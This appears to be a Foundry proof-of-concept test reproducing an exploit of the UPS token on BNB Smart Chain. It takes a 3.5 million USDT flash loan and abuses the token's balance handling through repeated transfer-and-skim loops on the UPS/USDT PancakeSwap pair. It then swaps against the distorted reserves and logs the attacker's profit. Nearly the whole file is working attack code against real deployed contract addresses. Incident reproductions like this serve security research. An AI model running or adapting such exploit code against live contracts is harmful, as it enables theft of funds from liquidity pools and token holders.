// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IPancakeV3.sol";

import "./IUps.sol";

IPancakeRouterV2 constant PancakeV2Router = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);

IUps constant UPSToken = IUps(0x3dA4828640aD831F3301A4597821Cc3461B06678);
IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

IPancakePairV2 constant UPS_USDT_Pool = IPancakePairV2(
    0xA2633ca9Eb7465E7dB54be30f62F577f039a2984
);

// USDT/USDC
IPancakePairV3 constant USDT_USDC_Pool = IPancakePairV3(
    0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb
);

contract UpsHack is Test {
    function fuckyou() public {
        USDT_USDC_Pool.flash(
            address(this),
            3500000 ether,
            0,
            hex"6675636b363636"
        );
    }

    function SwapToken(address a, address b, uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        PancakeV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        fee1;
        data;
        require(msg.sender == address(USDT_USDC_Pool), "not authorized");

        USDT.approve(address(PancakeV2Router), type(uint256).max);

        USDT.transfer(address(UPS_USDT_Pool), 2000000 ether);
        UPS_USDT_Pool.sync();

        SwapToken(address(USDT), address(UPSToken), 1000000 ether);

        uint256 i = 0;
        uint256 pair_balance = 0;
        uint256 here_balance = 0;
        uint256 transfer_amount = 0;
        while (i < 10) {
            pair_balance = UPSToken.balanceOf(address(UPS_USDT_Pool));
            here_balance = UPSToken.balanceOf(address(address(this)));
            console.log(">>>>", here_balance, pair_balance, "<<<<");
            if (here_balance > pair_balance) {
                transfer_amount = pair_balance;
            } else {
                transfer_amount = here_balance;
            }
            UPSToken.transfer(address(UPS_USDT_Pool), transfer_amount);
            UPS_USDT_Pool.skim(address(this));
            i++;
        }

        i = 0;
        while (i < 3) {
            transfer_amount = UPSToken.balanceOf(address(UPS_USDT_Pool));
            UPSToken.transfer(address(UPS_USDT_Pool), transfer_amount);
            (uint256 r0, uint256 r1, ) = UPS_USDT_Pool.getReserves();
            uint256 amountOut = PancakeV2Router.getAmountOut(
                transfer_amount - r0,
                r0,
                r1
            );
            UPS_USDT_Pool.swap(0, amountOut, address(this), "");
            i++;
        }

        // repay the money
        USDT.transfer(address(USDT_USDC_Pool), 3500000 ether + fee0);
    }
}

contract UpsTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 37680755 - 1);
    }

    function testExploit() public {
        UpsHack hacker = new UpsHack();

        emit log_named_decimal_uint(
            "[Begin] Attacker USDT before exploit",
            USDT.balanceOf(address(hacker)),
            18
        );

        hacker.fuckyou();

        emit log_named_decimal_uint(
            "[End] Attacker USDT after exploit",
            USDT.balanceOf(address(hacker)),
            18
        );
    }
}
